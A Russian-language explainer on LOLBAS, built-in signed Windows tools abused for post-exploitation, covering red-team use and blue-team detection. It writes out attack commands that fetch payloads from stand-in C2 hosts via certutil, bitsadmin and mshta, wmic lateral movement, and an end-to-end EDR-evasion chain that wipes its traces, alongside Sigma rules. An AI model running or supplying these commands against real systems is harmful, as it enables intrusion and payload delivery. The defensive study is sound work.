# LOLBAS: Каталог легитимных Windows-бинарников как вектор пост-эксплуатации

## Контекст и базовые понятия

Living Off The Land Binaries and Scripts (LOLBAS) представляют собой класс легитимных, цифрово подписанных Microsoft исполняемых файлов, скриптов и библиотек, предустановленных в операционных системах Windows. Ключевая характеристика данного класса — наличие функциональности, не являющейся основной (первичной) для данного инструмента, но пригодной для выполнения задач, традиционно ассоциируемых с вредоносным ПО: загрузки файлов, выполнения произвольного кода, обхода контроля учетных записей (UAC), перемещения по сети (lateral movement) и создания постоянных точек доступа (persistence).

Термин «Living Off The Land» (жизнь за счет земли) подчеркивает философию атакующих: отказ от использования собственного, кастомного вредоносного кода в пользу инструментов, уже присутствующих в целевой среде. Это устраняет необходимость в этапе «дропинга» (загрузки) вредоносного файла на диск, что делает обнаружение на уровне сигнатур файлов (AV/EDR signature-based) неэффективным.

Важно разграничивать смежные понятия, часто используемые в контексте LOLBAS:

1.  **LOLBins (Living Off The Land Binaries):** Исполняемые файлы (`.exe`, `.dll`, `.sys`), являющиеся частью ОС или установленные через официальные каналы Microsoft. Примеры: `certutil.exe`, `mshta.exe`, `regsvr32.exe`.
2.  **LOLScripts:** Скриптовые интерпретаторы и файлы скриптов (`.ps1`, `.vbs`, `.js`, `.wsf`). Примеры: `powershell.exe`, `wscript.exe`, `cscript.exe`.
3.  **LOLDrivers:** Подписанные драйверы ядра Windows, содержащие уязвимости, позволяющие атакующим выполнять код в режиме ядра (Ring 0). Примеры: драйверы старых версий антивирусов или компонентов Windows, уязвимые к LPE (Local Privilege Escalation).
4.  **GTFOBins:** Аналогичный каталог для операционных систем семейства Unix/Linux, содержащий легитимные утилиты, которые могут быть использованы для обхода ограничений безопасности.

Различие между LOLBins и обычными системными процессами заключается не в самом бинарном файле, а в **контексте его вызова** и **используемых аргументах**. Легитимное использование `certutil.exe` — управление сертификатами. Злоупотребление — загрузка файла с удаленного сервера через параметр `-urlcache`.

| Характеристика | Легитимное использование системных утилит | Злоупотребление (LOLBAS) |
| :--- | :--- | :--- |
| **Цель** | Администрирование, разработка, обслуживание ОС | Выполнение вредоносных задач (C2, exfiltration, persistence) |
| **Источник** | Официальный инсталлятор ОС или доверенный софт | Вызов из контекста атакующего (cmd, PowerShell, WMI) |
| **Сетевая активность** | Предсказуемая, соответствует профилю приложения | Аномальная для данного процесса (например, `msiexec` устанавливает соединение с C2) |
| **Детектирование** | Низкий риск, белый список EDR | Высокий риск, требует поведенческого анализа |
| **Подпись** | Microsoft (доверенная) | Microsoft (доверенная, но контекст аномален) |

LOLBAS не являются уязвимостью в классическом понимании (CVE). Это архитектурная особенность Windows, где мощные административные инструменты доступны обычным пользователям. Каталог LOLBAS Project (поддерживаемый сообществом и SpecterOps) систематизирует эти инструменты, предоставляя данные о том, какие именно функции могут быть использованы злоумышленниками.

```text
[Атакующий] ──(вызов)──▶ [LOLBin (напр. certutil.exe)]
                              │
                              ├──(легитимный сценарий)──▶ [Управление сертификатами]
                              │
                              └──(злоупотребление)──▶ [Загрузка payload / Exfiltration]
```

## Внутреннее устройство предмета

LOLBAS представляют собой не единый механизм, а разрозненный набор инструментов, каждый из которых имеет свою внутреннюю архитектуру и векторы злоупотребления. Для понимания предмета необходимо рассмотреть классификацию по функциональному назначению в рамках Kill Chain.

### Классификация по фазам атаки

LOLBAS охватывают практически все этапы атаки, начиная с первоначального доступа и заканчивая сбором данных.

1.  **Initial Access & Execution:**
    *   `mshta.exe`: Интерпретатор HTML Applications (HTA). Позволяет выполнять VBScript или JScript. Часто используется для обхода AppLocker, так как может загружать скрипты из реестра или сети.
    *   `regsvr32.exe`: Утилита регистрации COM-объектов. Поддерживает флаг `/s` (тихий режим) и `/i` (вызов команды). Может загружать DLL с удаленного сервера через `sct` (Script Component) файлы.
    *   `msiexec.exe`: Установщик Windows. Может загружать MSI-пакеты из сети (`/i http://...`) или выполнять скрипты через `Transforms`.

2.  **Defense Evasion & Persistence:**
    *   `schtasks.exe`: Планировщик задач. Используется для создания постоянных точек доступа, запуская скрипты или бинарники по расписанию.
    *   `reg.exe`: Работа с реестром. Позволяет изменять ключи автозагрузки (`Run`, `RunOnce`) или создавать новые службы.
    *   `vssadmin.exe` / `wmic.exe`: Управление теневыми копиями. Может использоваться для удаления теневых копий (для обхода восстановления) или, в случае `wmic`, для выполнения WMI-команд на удаленных машинах.

3.  **Credential Access & Discovery:**
    *   `cmdkey.exe`: Управление учётными данными. Может использоваться для сохранения паролей в хранилище (Credential Manager) или извлечения их в определенных контекстах.
    *   `runas.exe`: Запуск процессов от имени другого пользователя. Может использоваться для эскалации привилегий, если известны учетные данные администратора.
    *   `powershell.exe`: Хотя это скриптовый интерпретатор, он является ключевым LOLBin для сбора информации (`Get-CimInstance`, `Get-WmiObject`) и дампа памяти.

4.  **Lateral Movement:**
    *   `psexec.exe` (часть Sysinternals, но часто предустановлен или доступен): Хотя не всегда считается "native" в строгом смысле, часто включается в обзоры. Однако более "чистые" примеры — `wmic process call create` или `ssh.exe` (в Windows 10/11).
    *   `winrm.exe`: Windows Remote Management. Позволяет выполнять команды на удаленных машинах через протокол WS-Management.

5.  **Exfiltration:**
    *   `certutil.exe`: Загрузка файлов через `-urlcache -split -f`.
    *   `bitsadmin.exe`: Background Intelligent Transfer Service. Исторически использовался для загрузки файлов, имитируя трафик Windows Update.
    *   `curl.exe` / `wget.exe`: Присутствуют в современных версиях Windows (через Windows Subsystem for Linux или встроенные компоненты), используются для прямой передачи данных.

### Архитектура злоупотребления

Внутренний механизм злоупотребления LOLBAS строится на использовании **недокументированных или редко используемых параметров командной строки**. Официальная документация Microsoft описывает основной функционал, но многие флаги оставлены для обратной совместимости или специфических административных задач.

Например, `regsvr32.exe` предназначен для регистрации DLL. Однако его параметр `/i` вызывает функцию `DllInstall` внутри целевой DLL. Если DLL содержит реализацию этой функции, она выполнится. Атакующие создают вредоносные `sct`-файлы (XML-скрипты), которые `regsvr32` интерпретирует как компонент COM, загружая и выполняя код.

Другой пример — `certutil.exe`. Его основная функция — управление сертификатами. Параметр `-urlcache` позволяет кешировать файлы из интернета. Атакующие используют это для загрузки второго этапа загрузки (second-stage loader) без использования `Invoke-WebRequest` или `curl`, что делает сетевой трафик похожим на легитимную проверку обновлений сертификатов.

### Структура каталога LOLBAS

Каталог LOLBAS структурирован по именам бинарных файлов. Для каждого файла предоставляется:
1.  **Description:** Назначение утилиты.
2.  **Technique:** Соответствующая техника MITRE ATT&CK (например, T1112 - Modify Registry, T1105 - Ingress Tool Transfer).
3.  **Example:** Команда для демонстрации злоупотребления.
4.  **Detection:** Рекомендации по обнаружению.

```json
{
  "binary": "certutil.exe",
  "description": "Command-line program for performing certificate administration tasks.",
  "abuse_functionality": "Download files from HTTP/HTTPS URLs using URL cache.",
  "mitre_technique": "T1105: Ingress Tool Transfer",
  "example_command": "certutil -urlcache -split -f http://<C2>/payload.exe payload.exe",
  "detection_hint": "Monitor for 'certutil' with '-urlcache' and network connections to external IPs."
}
```

## Применение и работа с предметом

На практике работа с LOLBAS делится на два направления: Red Team (тестирование на проникновение) и Blue Team (обнаружение и реагирование).

### Red Team: Использование в пост-эксплуатации

После получения первоначального доступа (например, через фишинг), атакующий часто сталкивается с ограниченным окружением: отключенный PowerShell, заблокированные команды `cmd`, установленный EDR. В таких условиях LOLBAS становятся основным инструментом.

**Типовые операции:**

1.  **Обход AppLocker/WDAC:**
    AppLocker часто разрешает выполнение файлов из `C:\Windows\System32`. Атакующий может использовать легитимные бинарники из этой папки для выполнения своего кода. Например, использование `msbuild.exe` для компиляции и выполнения C#-кода на лету.

2.  **Загрузка инструментов (Ingress Tool Transfer):**
    Вместо `curl` или `wget`, которые могут быть заблокированы или отсутствовать, используется `certutil` или `bitsadmin`.
    ```powershell
    # Загрузка файла через bitsadmin
    bitsadmin /transfer myJob /download /priority normal http://192.168.1.100/payload.exe C:\Users\Public\payload.exe
    ```
    Этот метод создает процесс `bitsadmin.exe`, который устанавливает соединение с C2-сервером. Трафик выглядит как легитимный запрос Windows Update.

3.  **Выполнение кода (Execution):**
    Если PowerShell отключен, используется `mshta` для выполнения VBScript.
    ```cmd
    mshta vbscript:Close(Execute("GetObject(""script:https://<C2>/script.sct"")"))
    ```
    Здесь `mshta` загружает SCT-файл, который содержит XML с инструкциями для COM-объектов, что приводит к выполнению произвольного кода.

4.  **Перемещение по сети (Lateral Movement):**
    Использование `wmic` для запуска процессов на удаленных машинах.
    ```cmd
    wmic /node:192.168.1.10 /user:admin /password:pass process call create "cmd.exe /c whoami"
    ```
    Это позволяет атакующему выполнять команды на других узлах без установки агентов, используя встроенный протокол WMI.

### Blue Team: Обнаружение и детекция

Обнаружение LOLBAS требует перехода от сигнатурного анализа к поведенческому.

1.  **Логирование создания процессов:**
    Критически важно включить **Sysmon Event ID 1** (Process Creation) и **Windows Event ID 4688** с аргументами командной строки. Без аргументов детекция невозможна, так как сам бинарный файл легитимен.
    ```json
    {
      "EventID": 1,
      "Image": "C:\\Windows\\System32\\certutil.exe",
      "CommandLine": "certutil -urlcache -split -f http://evil.com/payload.exe"
    }
    ```

2.  **Анализ родительских процессов:**
    Легитимные LOLBins обычно запускаются администраторами через `explorer.exe`, `cmd.exe` или `powershell.exe` в контексте администрирования. Злоупотребление часто происходит из контекста `wscript.exe`, `mshta.exe` или `powershell.exe`, запущенного из временной папки.
    *   *Аномалия:* `mshta.exe`, запущенный из `C:\Users\Public\`.
    *   *Аномалия:* `regsvr32.exe`, запущенный с параметром `/s` и ссылкой на удаленный URL.

3.  **Сетевой анализ:**
    Мониторинг исходящих соединений от нетипичных процессов.
    *   `certutil.exe` не должен устанавливать HTTP-соединения для загрузки файлов.
    *   `msiexec.exe` не должен устанавливать соединения с неизвестными IP-адресами.
    *   `bitsadmin.exe` должен взаимодействовать только с доверенными доменами Microsoft.

4.  **Правила детекции (Sigma/YARA):**
    Пример правила Sigma для обнаружения злоупотребления `regsvr32`:
    ```yaml
    title: Suspicious RegSvr32 Execution
    id: 8a9c8b7d-6e5f-4d3c-2b1a-0987654321ab
    status: experimental
    description: Detects regsvr32.exe loading a scriptlet from a remote URL
    logsource:
        category: process_creation
        product: windows
    detection:
        selection:
            Image|endswith: '\regsvr32.exe'
            CommandLine|contains:
                - '/s'
                - '/i'
                - 'sct'
        condition: selection
    falsepositives:
        - Legitimate administration
    ```

### Типичные ошибки и подводные камни

*   **Игнорирование скриптов:** Фокус только на `.exe` игнорирует мощные векторы через `powershell.exe`, `wscript.exe`, `cscript.exe`.
*   **Недостаточное логирование:** Без сохранения аргументов командной строки в логах событий Windows (Event ID 4688) детекция LOLBAS практически невозможна.
*   **Ложное чувство безопасности:** Наличие цифровой подписи Microsoft не гарантирует безопасность контекста использования. EDR должен анализировать поведение, а не только файл.

## Сквозной практический пример: Обход EDR через цепочку LOLBins

**Исходные условия:**
*   **Среда:** Windows 10 Pro (обновленная), EDR (CrowdStrike/Defender) в режиме мониторинга.
*   **Роль:** Red Team оператор, получивший доступ через фишинг.
*   **Цель:** Загрузить второй этап загрузки (payload) с C2-сервера и выполнить его, избегая блокировки EDR.
*   **Ограничения:** PowerShell отключен групповой политикой, стандартные утилиты загрузки (`curl`, `wget`) отсутствуют или заблокированы.

**Шаг 1: Разведка и выбор инструмента**
Оператор проверяет наличие легитимных утилит для загрузки файлов. В Windows 10/11 доступна `certutil.exe`.

```powershell
# Проверка версии и доступности certutil
certutil -? | findstr /i "urlcache"
```
*Ожидаемый вывод:* Выводит справку, подтверждающую наличие параметра `-urlcache`.

**Шаг 2: Подготовка C2-сервера**
На атакующем сервере размещен вредоносный файл `payload.exe`.

**Шаг 3: Загрузка файла через LOLBin**
Оператор использует `certutil.exe` для загрузки файла. Команда имитирует легитимную операцию кеширования URL.

```cmd
certutil -urlcache -split -f http://192.168.1.50:8080/payload.exe C:\Users\Public\payload.exe
```

*Артефакт (Sysmon Event ID 1):*
```json
{
  "EventID": 1,
  "Image": "C:\\Windows\\System32\\certutil.exe",
  "CommandLine": "certutil -urlcache -split -f http://192.168.1.50:8080/payload.exe C:\\Users\\Public\\payload.exe",
  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
  "ParentCommandLine": "cmd.exe /c certutil -urlcache ..."
}
```

*Артефакт (Сетевой трафик):*
Запрос GET к `http://192.168.1.50:8080/payload.exe` от процесса `certutil.exe`.

**Шаг 4: Выполнение payload**
После загрузки файл находится в `C:\Users\Public\payload.exe`. Оператор выполняет его через легитимный интерпретатор, чтобы избежать прямого запуска исполняемого файла из подозрительной папки. Используется `msiexec.exe` для обхода некоторых политик выполнения, или просто прямой запуск, если EDR не блокирует его по поведению.

```cmd
C:\Users\Public\payload.exe
```

**Шаг 5: Обфускация следов**
Оператор удаляет кеш `certutil`, чтобы скрыть факт загрузки.

```cmd
certutil -urlcache delete http://192.168.1.50:8080/payload.exe
```

**Ожидаемый вывод:**
Файл успешно загружен и выполнен. EDR может сгенерировать алерт на основе аномального сетевого поведения `certutil.exe` (установка соединения с внешним IP), но не заблокирует процесс на этапе загрузки, так как бинарный файл легитимен. Удаление кеша стирает локальные артефакты загрузки.

## Аналитический вывод

LOLBAS представляют собой фундаментальный сдвиг в парадигме кибербезопасности Windows. Переход от защиты на уровне файлов к защите на уровне поведения обусловлен тем, что легитимные инструменты Windows обладают достаточной мощностью для выполнения всех этапов атаки. Статистика показывает рост использования LOLBins в 79% инцидентов в 2024 году, что делает их основным вектором атак.

Эффективная защита требует комплексного подхода:
1.  **Логирование:** Обязательное включение логирования аргументов командной строки (Sysmon Event ID 1, Event ID 4688).
2.  **Поведенческий анализ:** Мониторинг аномальных сетевых соединений от нетипичных процессов (например, `certutil` с исходящими HTTP-запросами).
3.  **Контроль выполнения:** Использование AppLocker или WDAC с правилами, запрещающими выполнение скриптов и бинарников из временных папок, даже если они подписаны.
4.  **Обучение:** Понимание функционала системных утилит как аналитиками, так и администраторами.

LOLBAS не являются уязвимостью, которую можно "закрыть" патчем. Это архитектурная особенность, требующая постоянной адаптации средств обнаружения и реагирования.
